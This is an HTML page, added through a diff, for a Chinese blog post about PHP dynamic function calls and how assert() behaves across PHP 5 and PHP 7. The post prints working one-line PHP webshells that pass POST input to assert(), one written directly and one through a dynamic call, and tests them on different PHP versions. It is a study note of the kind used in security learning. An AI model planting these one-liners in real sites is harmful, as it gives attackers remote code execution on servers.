@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="玄学-assert"/>
+  <meta name="twitter:description" content="前
+
+emmmmmm,本来只是一个一句话的函数，但是因为版本的问题，折腾了好久，所以记录一下
+
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>玄学-assert &middot; Yang1k</title>
+		<link rel="shortcut icon" href="https://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://yang1k.github.io/post'>Archive</a>
+	<a href='https://yang1k.github.io/tags'>Tags</a>
+	<a href='https://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="https://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        玄学-assert
+                    </h1>
+                    <h2 class="headline">
+                    Jun 1, 2018 09:54
+                    · 83 words
+                    · 1 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://yang1k.github.io/tags/php">PHP</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li><a href="#前">前</a></li>
+<li><a href="#动态函数执行">动态函数执行</a></li>
+<li><a href="#assert函数">assert函数</a>
+<ul>
+<li><a href="#php7版本">php7版本</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <h2 id="前">前</h2>
+
+<p>emmmmmm,本来只是一个一句话的函数，但是因为版本的问题，折腾了好久，所以记录一下</p>
+
+<!-- more -->
+
+<h2 id="动态函数执行">动态函数执行</h2>
+
+<p>在php中，允许动态函数执行。当时看到这里有点懵，什么是动态函数执行？</p>
+
+<p>示例</p>
+
+<pre><code>$a = &quot;ass&quot;;
+function ass(){
+    echo &quot;sdas&quot;;
+}
+
+ass();
+echo &quot;&lt;br&gt;&quot;;
+$a();
+
+</code></pre>
+
+<p>这两种写法都执行了assert()函数，第二种调用方法就是所谓动态函数执行。</p>
+
+<h2 id="assert函数">assert函数</h2>
+
+<p>###　php5版本
+ 官方文档</p>
+
+<pre><code>bool assert ( mixed $assertion [, string $description ] )
+
+如果 assertion 是字符串，它将会被 assert() 当做 PHP 代码来执行。
+assertion 是字符串的优势是当禁用断言时它的开销会更小，并且在断言失败时消息会包含 assertion 表达式。 这意味着如果你传入了 boolean 的条件作为 assertion，这个条件将不会显示为断言函数的参数；在调用你定义的 assert_options() 处理函数时，条件会转换为字符串，而布尔值 FALSE 会被转换成空字符串
+</code></pre>
+
+<p>由文档可知，我们可以这样写一句话</p>
+
+<pre><code>&lt;?php assert($_POST[a]);?&gt;
+
+</code></pre>
+
+<p>在php5.4.16版本下，测试没有问题。</p>
+
+<p>继续测试使用动态调用</p>
+
+<pre><code>&lt;?php
+$a = &quot;assert&quot;;
+$a($_POST[a]);
+?&gt;
+</code></pre>
+
+<p>在php5.4.16版本下，测试没有问题。</p>
+
+<h3 id="php7版本">php7版本</h3>
+
+<p><strong><em>php官方在php7中更改了assert函数。在php7.0.29之后的版本不支持动态调用。</em></strong></p>
+
+<p>以上两种调用方法在php7.0.29版本之前都测试成功，7.0.29版本之后动态调用的方法无法成功。</p>
+
+<p>在7.0.29版本之后发现的奇怪的一点</p>
+
+<pre><code>&lt;?php
+//?a=phpinfo()
+$a = 'assert';
+$a($_POST['a']);
+?&gt;
+//phpinfo()无法执行成功
+</code></pre>
+
+<pre><code class="language-php">&lt;?php
+$a = 'assert';
+$a(phpinfo());
+?&gt;
+//成功执行phpinfo()
+
+</code></pre>
+
+<blockquote>
+<p>真的是玄学,刚开始测试的都失败了，后来测试又没有问题，。。。。。。。醉了，废了一下午的时间。</p>
+</blockquote>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fyang1k.github.io%2ftypecho%2fpost%2f%25E7%258E%2584%25E5%25AD%25A6-assert%2f - %e7%8e%84%e5%ad%a6-assert "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="https://yang1k.github.io/js/main.js"></script>
+<script src="https://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
